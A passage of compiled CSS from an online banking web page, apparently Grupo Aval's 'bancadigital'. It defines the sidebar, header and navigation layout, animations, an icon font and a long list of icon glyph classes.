      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] p[_ngcontent-qmv-c237] {
        display: block
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237] {
        margin-right: 1rem
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237] {
        color: #fff;
        position: relative
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237] {
        background-image: initial;
        animation: none
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237]:before {
        opacity: 0
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237]:before {
        background-image: linear-gradient(90deg, rgb(170, 35, 42) 0%, rgb(229, 62, 45) 60%);
        width: calc(100% - 20px)
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237]:before {
        width: 0;
        height: 100%;
        border-top-right-radius: 100px;
        border-bottom-right-radius: 100px;
        transition: width .3s ease
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] {
        width: calc(100% - 200px)
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open .page-wrapper-footer-images .grupo-aval {
        display: block
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper[_ngcontent-qmv-c237] {
        display: flex;
        justify-content: flex-end;
        width: 100vw
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar[_ngcontent-qmv-c237] {
        width: 52px;
        position: fixed;
        top: 0;
        left: 0;
        height: 100vh
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar[_ngcontent-qmv-c237]:hover .toggle-arrow[_ngcontent-qmv-c237] {
        display: block
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar[_ngcontent-qmv-c237] .toggle-arrow[_ngcontent-qmv-c237] {
        cursor: pointer;
        position: absolute;
        top: 55px;
        right: -11px;
        font-size: 24px;
        background-color: #fff;
        border-radius: 50%;
        border: solid 1px #c3cfe2
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-brand[_ngcontent-qmv-c237] {
        display: flex;
        justify-content: center;
        padding: 17px 0
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-brand[_ngcontent-qmv-c237] a[_ngcontent-qmv-c237] {
        cursor: pointer
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-brand[_ngcontent-qmv-c237] .avv-open[_ngcontent-qmv-c237] {
        display: none
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-brand[_ngcontent-qmv-c237] .avv-close[_ngcontent-qmv-c237] {
        display: block
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] {
        height: initial;
        margin-top: 85px
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] {
        display: block
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] {
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 10px 20px 10px 30px;
        color: transparent
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237] {
        color: #283747
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237]:before {
        content: "";
        position: absolute;
        top: 0;
        left: 0;
        width: 0;
        z-index: -1;
        background-color: transparent;
        transition: width .3s ease
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237] {
        position: relative
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237]:before {
        background-image: linear-gradient(260deg, #E1001D 99%, #A00104 5%);
        height: 36px;
        width: 100%
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] {
        padding: 0;
        width: calc(100% - 52px)
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-footer {
        display: flex !important
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-footer-images .grupo-aval {
        display: none
      }
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c236_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c236_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .page-wrapper-footer[_ngcontent-qmv-c236] {
      width: 100%;
      height: 140px;
      display: flex;
      justify-content: space-between;
      flex-direction: column;
      position: absolute;
      bottom: 0;
      pointer-events: none
    }

    .page-wrapper-footer-images[_ngcontent-qmv-c236] {
      display: flex;
      align-items: flex-end
    }

    .page-wrapper-footer-images[_ngcontent-qmv-c236] .guarded-logo[_ngcontent-qmv-c236] {
      height: 120px;
      margin-left: 8px
    }

    .page-wrapper-footer-images[_ngcontent-qmv-c236] .grupo-aval[_ngcontent-qmv-c236] {
      margin-left: 42px;
      width: 70px
    }

    .page-wrapper-footer-gradient[_ngcontent-qmv-c236] {
      width: 100%;
      height: 10px
    }
  </style>
  <style>
    @keyframes arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes spin {
      to {
        transform: rotate(360deg)
      }
    }

    .header-avv {
      height: 65px;
      padding: 1rem 2rem;
      box-shadow: 0 2px 4px #2c2c333d;
      align-items: center
    }

    .header-avv-line {
      width: 100%;
      height: 8px;
      background-image: linear-gradient(269deg, #E1001D 100%, #A00104 2%)
    }

    .header-avv .banner-user-name {
      font-size: 18px;
      color: #283747;
      position: relative;
      height: 35px
    }

    .header-avv .banner-user-name p {
      margin-bottom: 0;
      line-height: 1.78;
      width: max-content
    }

    @media (min-width: 1200px) and (max-width: 1235px) {
      .header-avv .banner-user-name p {
        width: 220px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap
      }
    }

    .header-avv .banner-user-name img {
      margin-top: -1rem
    }

    .header-avv .user-login-data {
      display: flex;
      padding: 12px 14px;
      cursor: default;
      justify-content: flex-start
    }

    .header-avv .user-login-data-logo {
      height: 120px;
      margin-right: 8px
    }

    .header-avv .user-login-data-footer {
      display: flex;
      flex-direction: column;
      justify-content: flex-end
    }

    .header-avv .user-login-data-footer .grupo-aval {
      width: 70px;
      margin-bottom: 1rem
    }

    .header-avv .user-login-data-footer ul {
      list-style: none;
      padding: 0;
      margin: 0
    }

    .header-avv .user-login-data-footer ul li {
      font-size: 11px;
      line-height: 1.45;
      color: #5c6b7a;
      padding-bottom: 2px
    }

    .header-avv .user-login-data-footer ul li:last-child {
      padding-bottom: 0
    }

    .header-avv .user-login-data-footer ul li b,
    .header-avv .user-login-data-footer ul li p {
      display: inline-block;
      padding: 0;
      margin: 0
    }

    .header-avv .navbar {
      max-width: initial !important;
      padding: 0
    }

    @media (min-width: 768px) {
      .header-avv .navbar {
        justify-content: flex-end
      }
    }

    .header-avv .navbar-landing {
      display: flex;
      align-items: center
    }

    .header-avv .navbar-landing .icon {
      font-size: 24px;
      margin-right: 8px;
      cursor: pointer
    }

    .header-avv .navbar-landing h5 {
      font-size: 20px;
      line-height: 1.6;
      margin-bottom: 0
    }

    .header-avv .navbar .btns-navbar-mobile .btn-logout {
      position: relative;
      top: 3px;
      margin-right: 5px;
      padding: 0
    }

    .header-avv .navbar .btns-navbar-mobile .btn-logout>span {
      font-size: 27px
    }

    @media (min-width: 768px) {
      .header-avv .navbar {
        border: initial;
        padding: 0 !important
      }
    }

    .header-avv .navbar .nav-bar-brand {
      cursor: pointer
    }

    .header-avv .navbar .nav-bar-brand>img {
      height: 36px;
      min-width: 110px
    }

    .header-avv .navbar .nav-bar-brand>img:focus {
      outline: inherit
    }

    .header-avv .navbar .navbar-collapse {
      position: fixed;
      z-index: 1001;
      justify-content: flex-end
    }

    .header-avv .navbar .navbar-collapse:not(.show) {
      opacity: 0;
      visibility: hidden
    }

    @media (min-width: 1200px) {
      .header-avv .navbar .navbar-collapse {
        position: inherit;
        z-index: inherit;
        opacity: 1 !important;
        visibility: visible !important
      }
    }

    .header-avv .navbar .navbar-collapse.show {
      width: 100vw;
      height: 100vh;
      top: 0;
      left: 0;
      opacity: 1;
      visibility: visible
    }

    .header-avv .navbar .navbar-collapse.show .bg-header {
      opacity: 1;
      visibility: visible
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu {
      right: 0;
      max-width: 256px
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu .gradient {
      height: 10px
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content .subheader {
      background-image: linear-gradient(259deg, #FF002D 0%, #7D000A);
      color: #fff;
      width: 100%;
      height: 56px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 21px 15px 18px;
      margin-bottom: 10px
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content .subheader .title {
      font-weight: 600;
      font-style: normal;
      font-stretch: normal;
      line-height: normal;
      letter-spacing: normal;
      margin: 0
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content .subheader span.close-icon {
      font-size: 22px
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul {
      padding: 0 15px 20px 0
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li {
      display: flex;
      align-items: center;
      padding: 15px 24px
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li img {
      width: 16px;
      height: 16px;
      margin-right: 1rem
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li span {
      font-size: 16px;
      line-height: 1.5;
      margin-right: 1rem
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li p {
      margin: 0
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown {
      display: block
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown.active {
      border-bottom: solid 1px #c3cfe2;
      padding: 20px 15px 0 0
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown.active .nav-link {
      background-image: linear-gradient(259deg, #E1001D 0%, #C30018);
      border-top-right-radius: 100px;
      border-bottom-right-radius: 100px;
      color: #fff;
      padding: 10px 15px
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown.active .nav-link-list {
      padding-right: 0
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown.active .nav-link-list li span {
      display: none
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown.active .nav-link-list li p {
      color: #77899a
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown.active .nav-link-list li:last-child {
      border-bottom: inherit;
      padding-bottom: 0
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown .nav-link {
      display: flex;
      align-items: center;
      padding: 0;
      width: 100%
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown .nav-link.dropdown {
      justify-content: space-between
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown .nav-link.dropdown .label {
      font-size: 14px;
      display: flex;
      align-items: center
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown .nav-link.dropdown .icon-dropdown {
      position: relative;
      top: -2px;
      left: 10px;
      font-size: 24px;
      transition: transform .4s ease;
      margin-top: 2px;
      margin-right: 30px
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown .nav-link.dropdown .icon-dropdown.open {
      transform: rotate(180deg)
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown .nav-link-list {
      padding-left: 15px
    }

    .header-avv .navbar .navbar-collapse.show .nav-principal-menu-content ul li.li-dropdown .nav-link-list li {
      border-bottom: solid 1px #C3CFE2;
      padding: 13px 0
    }

    .header-avv .navbar .navbar-collapse .bg-header {
      width: 100%;
      height: 100%;
      opacity: 0;
      visibility: hidden;
      transition: .3s;
      background-color: #28374766
    }

    .header-avv .navbar .navbar-collapse .nav-principal-menu {
      width: 80%;
      height: 100%;
      position: fixed;
      top: 0;
      right: -90%;
      transition: .3s;
      background-color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      overflow-x: hidden;
      overflow-y: auto
    }

    @media (min-width: 1200px) {
      .header-avv .navbar .navbar-collapse .nav-principal-menu {
        width: initial;
        position: initial;
        overflow-x: initial;
        overflow-y: initial
      }
    }

    .header-avv .navbar .navbar-collapse .nav-user-links {
      display: flex;
      align-items: flex-end;
      justify-content: flex-end
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .icon {
      align-self: center;
      font-size: 16px;
      padding-left: 4px;
      padding-right: 4px
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon {
      cursor: pointer;
      position: relative;
      padding: 2px 0
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon .new-item {
      position: absolute;
      top: -6px;
      right: -20px;
      padding: 1px 8px;
      font-size: 11px;
      background: #A00104;
      color: #fff;
      width: 50px;
      height: 16px;
      border-radius: 5px
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon .content-icon {
      display: flex;
      flex-direction: row;
      align-items: flex-end;
      height: 30px
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon .content-icon.btn-logout-content {
      display: flex;
      flex-direction: row;
      align-items: flex-end
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon .content-icon.btn-logout-content img {
      width: 16px;
      height: 16px;
      align-self: center
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon .content-icon .text {
      font-size: 14px;
      line-height: 1.71;
      font-weight: 600;
      margin-top: 0
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon .bread-crumb {
      display: none
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon.active {
      color: #e1001d
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon.active .new-item {
      display: none
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon.active .bread-crumb {
      display: block;
      width: 30px;
      height: 2px
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon.active .content-icon .text {
      color: #e1001d
    }

    @media (min-width: 1200px) {
      .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon {
        margin-right: 12px
      }

      .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon:last-child {
        margin-right: 0
      }
    }

    @media (min-width: 1280px) {
      .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon {
        margin-right: 18px
      }
    }

    @media (min-width: 1400px) {
      .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon {
        margin-right: 24px
      }
    }

    .header-avv .navbar .navbar-collapse .nav-user-links .nav-icon:hover:not(.active) {
      border-radius: 18px;
      background-color: #f1f5fb
    }

    @media (min-width: 1200px) {
      .header-avv {
        padding: 1rem 2.5rem
      }

      .header-avv.has-border {
        position: relative
      }

      .header-avv.has-border:before {
        content: "";
        position: absolute;
        bottom: 0;
        left: -50%;
        background-color: #dee2e6;
        width: 200%;
        height: 1px
      }
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c234_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c234_spin {
      to {
        transform: rotate(360deg)
      }
    }

    @font-face {
      font-family: icomoon;
      src: url(/bancadigital/assets/fonts/icons/icomoon.eot?5kr4in);
      src: url(/bancadigital/assets/fonts/icons/icomoon.eot?5kr4in#iefix) format("embedded-opentype"), url(/font/icomoon.woff2) format("woff2"), url(/bancadigital/assets/fonts/icons/icomoon.ttf?5kr4in) format("truetype"), url(./font/icomoon.woff?5kr4in) format("woff"), url(/bancadigital/assets/fonts/icons/icomoon.svg?5kr4in#icomoon) format("svg");
      font-weight: 400;
      font-style: normal;
      font-display: block
    }

    [class^=icon-][_ngcontent-qmv-c234],
    [class*=" icon-"][_ngcontent-qmv-c234] {
      font-family: icomoon, serif !important;
      speak: none;
      font-style: normal;
      font-weight: 400;
      font-variant: normal;
      text-transform: none;
      line-height: 1;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale
    }

    .icon-shopping-bag[_ngcontent-qmv-c234]:before {
      content: "\e9af"
    }

    .icon-contacts[_ngcontent-qmv-c234]:before {
      content: "\e9ac"
    }

    .icon-cookie[_ngcontent-qmv-c234]:before {
      content: "\e9ad"
    }

    .icon-circle-check[_ngcontent-qmv-c234]:before {
      content: "\e9ae"
    }

    .icon-chequera[_ngcontent-qmv-c234]:before {
      content: "\e9ab"
    }

    .icon-Borrar-2[_ngcontent-qmv-c234]:before {
      content: "\e9a9"
    }

    .icon-Punto[_ngcontent-qmv-c234]:before {
      content: "\e9aa"
    }

    .icon-woman-1[_ngcontent-qmv-c234]:before {
      content: "\e9a8"
    }

    .icon-prueba[_ngcontent-qmv-c234]:before {
      content: "\e9a6"
    }

    .icon-billetera[_ngcontent-qmv-c234]:before {
      content: "\e9a5"
    }

    .icon-business[_ngcontent-qmv-c234]:before {
      content: "\e9a7"
    }

    .icon-icon-calendario-vacio[_ngcontent-qmv-c234]:before {
      content: "\e9a3"
    }

    .icon-icon-cdt-resumen[_ngcontent-qmv-c234]:before {
      content: "\e9a4"
    }

    .icon-qr[_ngcontent-qmv-c234]:before {
      content: "\e9a1"
    }

    .icon-faceid[_ngcontent-qmv-c234]:before {
      content: "\e9a2"
    }

    .icon-callcenter[_ngcontent-qmv-c234]:before {
      content: "\e9a0"
    }

    .icon-Huella[_ngcontent-qmv-c234]:before {
      content: "\e99f"
    }

    .icon-bolsillos[_ngcontent-qmv-c234]:before {
      content: "\e900"
    }

    .icon-inscribir[_ngcontent-qmv-c234]:before {
      content: "\e901"
    }

    .icon-abrir_pantalla[_ngcontent-qmv-c234]:before {
      content: "\e902"
    }

    .icon-acciones_productos_financieros[_ngcontent-qmv-c234]:before {
      content: "\e903"
    }

    .icon-actualizar_2[_ngcontent-qmv-c234]:before {
      content: "\e904"
    }

    .icon-actualizar[_ngcontent-qmv-c234]:before {
      content: "\e905"
    }

    .icon-actualizar3[_ngcontent-qmv-c234]:before {
      content: "\e906"
    }

    .icon-adjuntar[_ngcontent-qmv-c234]:before {
      content: "\e907"
    }

    .icon-agregar_hoja[_ngcontent-qmv-c234]:before {
      content: "\e908"
    }

    .icon-agregar_persona[_ngcontent-qmv-c234]:before {
      content: "\e909"
    }

    .icon-agregar[_ngcontent-qmv-c234]:before {
      content: "\e90a"
    }

    .icon-agrupar[_ngcontent-qmv-c234]:before {
      content: "\e90b"
    }

    .icon-Ahorro[_ngcontent-qmv-c234]:before {
      content: "\e90c"
    }

    .icon-alerta[_ngcontent-qmv-c234]:before {
      content: "\e90d"
    }

    .icon-almacenamiento[_ngcontent-qmv-c234]:before {
      content: "\e90e"
    }

    .icon-ampliar[_ngcontent-qmv-c234]:before {
      content: "\e90f"
    }

    .icon-apagar[_ngcontent-qmv-c234]:before {
      content: "\e910"
    }

    .icon-arroba[_ngcontent-qmv-c234]:before {
      content: "\e911"
    }

    .icon-avances[_ngcontent-qmv-c234]:before {
      content: "\e912"
    }

    .icon-back[_ngcontent-qmv-c234]:before {
      content: "\e913"
    }

    .icon-barras[_ngcontent-qmv-c234]:before {
      content: "\e914"
    }

    .icon-basura[_ngcontent-qmv-c234]:before {
      content: "\e915"
    }

    .icon-bluetooth[_ngcontent-qmv-c234]:before {
      content: "\e916"
    }

    .icon-bolquear_vista[_ngcontent-qmv-c234]:before {
      content: "\e917"
    }

    .icon-brujula[_ngcontent-qmv-c234]:before {
      content: "\e918"
    }

    .icon-caht_2[_ngcontent-qmv-c234]:before {
      content: "\e919"
    }

    .icon-caja[_ngcontent-qmv-c234]:before {
      content: "\e91a"
    }

    .icon-calendario[_ngcontent-qmv-c234]:before {
      content: "\e91b"
    }

    .icon-camara[_ngcontent-qmv-c234]:before {
      content: "\e91c"
    }

    .icon-casa_apto[_ngcontent-qmv-c234]:before {
      content: "\e91d"
    }

    .icon-celular[_ngcontent-qmv-c234]:before {
      content: "\e91e"
    }

    .icon-chat[_ngcontent-qmv-c234]:before {
      content: "\e91f"
    }

    .icon-check[_ngcontent-qmv-c234]:before {
      content: "\e920"
    }

    .icon-chip[_ngcontent-qmv-c234]:before {
      content: "\e921"
    }

    .icon-chrome[_ngcontent-qmv-c234]:before {
      content: "\e922"
    }

    .icon-coffee[_ngcontent-qmv-c234]:before {
      content: "\e923"
    }

    .icon-compartir[_ngcontent-qmv-c234]:before {
      content: "\e924"
    }

    .icon-compras[_ngcontent-qmv-c234]:before {
      content: "\e925"
    }

    .icon-computer[_ngcontent-qmv-c234]:before {
      content: "\e926"
    }

    .icon-configuracion[_ngcontent-qmv-c234]:before {
      content: "\e927"
    }

    .icon-credito_rotativo[_ngcontent-qmv-c234]:before {
      content: "\e928"
    }

    .icon-cruz[_ngcontent-qmv-c234]:before {
      content: "\e929"
    }

    .icon-data[_ngcontent-qmv-c234]:before {
      content: "\e92a"
    }

    .icon-depositos[_ngcontent-qmv-c234]:before {
      content: "\e92b"
    }

    .icon-descarga_de_la_nube[_ngcontent-qmv-c234]:before {
      content: "\e92c"
    }

    .icon-descarga[_ngcontent-qmv-c234]:before {
      content: "\e92d"
    }

    .icon-descargar[_ngcontent-qmv-c234]:before {
      content: "\e92e"
    }

    .icon-dinero[_ngcontent-qmv-c234]:before {
      content: "\e92f"
    }

    .icon-dislike[_ngcontent-qmv-c234]:before {
      content: "\e930"
    }

    .icon-display_por-definir-nombre[_ngcontent-qmv-c234]:before {
      content: "\e931"
    }

    .icon-down[_ngcontent-qmv-c234]:before {
      content: "\e932"
    }

    .icon-drag[_ngcontent-qmv-c234]:before {
      content: "\e933"
    }

    .icon-editar[_ngcontent-qmv-c234]:before {
      content: "\e934"
    }

    .icon-educacion[_ngcontent-qmv-c234]:before {
      content: "\e935"
    }

    .icon-eliminar_usuario[_ngcontent-qmv-c234]:before {
      content: "\e936"
    }

    .icon-enviar_3[_ngcontent-qmv-c234]:before {
      content: "\e937"
    }

    .icon-enviar[_ngcontent-qmv-c234]:before {
      content: "\e938"
    }

    .icon-equipo[_ngcontent-qmv-c234]:before {
      content: "\e939"
    }

    .icon-equipo1[_ngcontent-qmv-c234]:before {
      content: "\e93a"
    }

    .icon-estrella[_ngcontent-qmv-c234]:before {
      content: "\e93b"
    }

    .icon-etiqueta[_ngcontent-qmv-c234]:before {
      content: "\e93c"
    }

    .icon-extractos[_ngcontent-qmv-c234]:before {
      content: "\e93d"
    }

    .icon-fechas_especiales[_ngcontent-qmv-c234]:before {
      content: "\e93e"
    }

    .icon-flecha_abajo_2[_ngcontent-qmv-c234]:before {
      content: "\e93f"
    }

    .icon-flecha_arriba_2[_ngcontent-qmv-c234]:before {
      content: "\e940"
    }

    .icon-flecha_arriba[_ngcontent-qmv-c234]:before {
      content: "\e941"
    }

    .icon-flecha_doble_der[_ngcontent-qmv-c234]:before {
      content: "\e942"
    }

    .icon-flecha_doble_izq[_ngcontent-qmv-c234]:before {
      content: "\e943"
    }

    .icon-flecha_perdida[_ngcontent-qmv-c234]:before {
      content: "\e944"
    }

    .icon-flecha_subida[_ngcontent-qmv-c234]:before {
      content: "\e945"
    }

    .icon-folder_agregar[_ngcontent-qmv-c234]:before {
      content: "\e946"
    }

    .icon-folder_negativo[_ngcontent-qmv-c234]:before {
      content: "\e947"
    }

    .icon-folder[_ngcontent-qmv-c234]:before {
      content: "\e948"
    }

    .icon-formulario[_ngcontent-qmv-c234]:before {
      content: "\e949"
    }

    .icon-funnel[_ngcontent-qmv-c234]:before {
      content: "\e94a"
    }

    .icon-gastos_financieros[_ngcontent-qmv-c234]:before {
      content: "\e94b"
    }

    .icon-giros_y_transferencias[_ngcontent-qmv-c234]:before {
      content: "\e94c"
    }

    .icon-grupo[_ngcontent-qmv-c234]:before {
      content: "\e94d"
    }

    .icon-guardar[_ngcontent-qmv-c234]:before {
      content: "\e94e"
    }

    .icon-imagen[_ngcontent-qmv-c234]:before {
      content: "\e94f"
    }

    .icon-imprimir[_ngcontent-qmv-c234]:before {
      content: "\e950"
    }

    .icon-Impuestos[_ngcontent-qmv-c234]:before {
      content: "\e951"
    }

    .icon-info[_ngcontent-qmv-c234]:before {
      content: "\e952"
    }

    .icon-informacion_2[_ngcontent-qmv-c234]:before {
      content: "\e953"
    }

    .icon-informacion[_ngcontent-qmv-c234]:before {
      content: "\e954"
    }

    .icon-libro[_ngcontent-qmv-c234]:before {
      content: "\e955"
    }

    .icon-like[_ngcontent-qmv-c234]:before {
      content: "\e956"
    }

    .icon-linkeado[_ngcontent-qmv-c234]:before {
      content: "\e957"
    }

    .icon-logout[_ngcontent-qmv-c234]:before {
      content: "\e958"
    }

    .icon-love[_ngcontent-qmv-c234]:before {
      content: "\e959"
    }

    .icon-lupa_acercar[_ngcontent-qmv-c234]:before {
      content: "\e95a"
    }

    .icon-lupa_menos[_ngcontent-qmv-c234]:before {
      content: "\e95b"
    }

    .icon-lupa_search[_ngcontent-qmv-c234]:before {
      content: "\e95c"
    }

    .icon-mail[_ngcontent-qmv-c234]:before {
      content: "\e95d"
    }

    .icon-mapa[_ngcontent-qmv-c234]:before {
      content: "\e95e"
    }

    .icon-marcador[_ngcontent-qmv-c234]:before {
      content: "\e95f"
    }

    .icon-marco[_ngcontent-qmv-c234]:before {
      content: "\e960"
    }

    .icon-mark[_ngcontent-qmv-c234]:before {
      content: "\e961"
    }

    .icon-menos_circulo[_ngcontent-qmv-c234]:before {
      content: "\e962"
    }

    .icon-menu[_ngcontent-qmv-c234]:before {
      content: "\e963"
    }

    .icon-mis_bolsillos[_ngcontent-qmv-c234]:before {
      content: "\e964"
    }

    .icon-mis_CDTs[_ngcontent-qmv-c234]:before {
      content: "\e965"
    }

    .icon-mis_otros_creditos[_ngcontent-qmv-c234]:before {
      content: "\e966"
    }

    .icon-negocios_ventas[_ngcontent-qmv-c234]:before {
      content: "\e967"
    }

    .icon-next[_ngcontent-qmv-c234]:before {
      content: "\e968"
    }

    .icon-no_foto[_ngcontent-qmv-c234]:before {
      content: "\e969"
    }

    .icon-no_notificaciones[_ngcontent-qmv-c234]:before {
      content: "\e96a"
    }

    .icon-no_se_puede[_ngcontent-qmv-c234]:before {
      content: "\e96b"
    }

    .icon-no_seguro[_ngcontent-qmv-c234]:before {
      content: "\e96c"
    }

    .icon-no_video[_ngcontent-qmv-c234]:before {
      content: "\e96d"
    }

    .icon-no_wifi[_ngcontent-qmv-c234]:before {
      content: "\e96e"
    }

    .icon-notificaciones[_ngcontent-qmv-c234]:before {
      content: "\e96f"
    }

    .icon-otros-ingresos[_ngcontent-qmv-c234]:before {
      content: "\e970"
    }

    .icon-otros_gastos[_ngcontent-qmv-c234]:before {
      content: "\e971"
    }

    .icon-otros[_ngcontent-qmv-c234]:before {
      content: "\e972"
    }

    .icon-paginas[_ngcontent-qmv-c234]:before {
      content: "\e973"
    }

    .icon-pagos[_ngcontent-qmv-c234]:before {
      content: "\e974"
    }

    .icon-pausa[_ngcontent-qmv-c234]:before {
      content: "\e975"
    }

    .icon-persona_eliminar[_ngcontent-qmv-c234]:before {
      content: "\e976"
    }

    .icon-pie_chart[_ngcontent-qmv-c234]:before {
      content: "\e977"
    }

    .icon-play[_ngcontent-qmv-c234]:before {
      content: "\e978"
    }

    .icon-porcentaje[_ngcontent-qmv-c234]:before {
      content: "\e979"
    }

    .icon-previos[_ngcontent-qmv-c234]:before {
      content: "\e97a"
    }

    .icon-previosly[_ngcontent-qmv-c234]:before {
      content: "\e97b"
    }

    .icon-puntos[_ngcontent-qmv-c234]:before {
      content: "\e97c"
    }

    .icon-regalos[_ngcontent-qmv-c234]:before {
      content: "\e97d"
    }

    .icon-reloj[_ngcontent-qmv-c234]:before {
